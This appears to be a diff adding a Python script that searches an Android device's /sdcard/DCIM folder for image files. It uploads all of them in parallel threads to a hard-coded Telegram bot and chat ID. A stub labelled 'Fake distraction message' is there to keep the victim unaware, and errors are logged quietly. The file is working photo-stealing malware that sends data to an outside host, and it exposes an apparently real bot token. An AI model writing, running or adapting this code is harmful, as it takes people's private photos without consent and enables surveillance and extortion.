@@ -1,0 +1,83 @@
+import os
+import telebot
+import threading
+import queue
+import logging
+import time
+
+# Logging configuration
+logging.basicConfig(level=logging.ERROR, filename='bot_errors.log', filemode='a', format='%(asctime)s - %(message)s')
+
+# Telegram bot details
+TELEGRAM_BOT_TOKEN = '7844294258:AAH2MHOKWETuJluxIs0StnXjki7OFgHtkvY'
+CHAT_ID = '7498653159'
+
+# Create the bot
+bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
+
+# Image queue for threading
+image_queue = queue.Queue()
+
+# Function to upload photos
+def upload_photo(photo_path):
+    try:
+        with open(photo_path, 'rb') as photo:
+            bot.send_photo(CHAT_ID, photo)
+            time.sleep(0.5)
+    except Exception as e:
+        logging.error(f"Error uploading {photo_path}: {e}")
+    finally:
+        image_queue.task_done()
+
+# Function to find images
+def find_images():
+    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp']
+    images_found = []
+    if not os.path.exists('/sdcard/DCIM'):
+        logging.error("Path '/sdcard/DCIM' does not exist or cannot be accessed.")
+        return images_found
+    for root, dirs, files in os.walk('/sdcard/DCIM'):
+        for file in files:
+            if any(file.lower().endswith(ext) for ext in image_extensions):
+                images_found.append(os.path.join(root, file))
+    return images_found
+
+# Fake distraction message
+def fake_message():
+    pass
+
+# Function to send images using threads
+def send_images_concurrently(images, max_threads=20):
+    for image in images:
+        image_queue.put(image)
+
+    for _ in range(max_threads):
+        thread = threading.Thread(target=worker)
+        thread.daemon = True
+        thread.start()
+
+    image_queue.join()
+
+# Worker function for threading
+def worker():
+    while True:
+        try:
+            photo_path = image_queue.get(timeout=3)
+            upload_photo(photo_path)
+        except queue.Empty:
+            break
+
+# Main function
+def main():
+    try:
+        fake_message()
+        images = find_images()
+        if images:
+            send_images_concurrently(images, max_threads=10)
+    except KeyboardInterrupt:
+        logging.error("Interrupted by user.")
+    except Exception as e:
+        logging.error(f"Unexpected error: {e}")
+
+if __name__ == "__main__":
+    main()
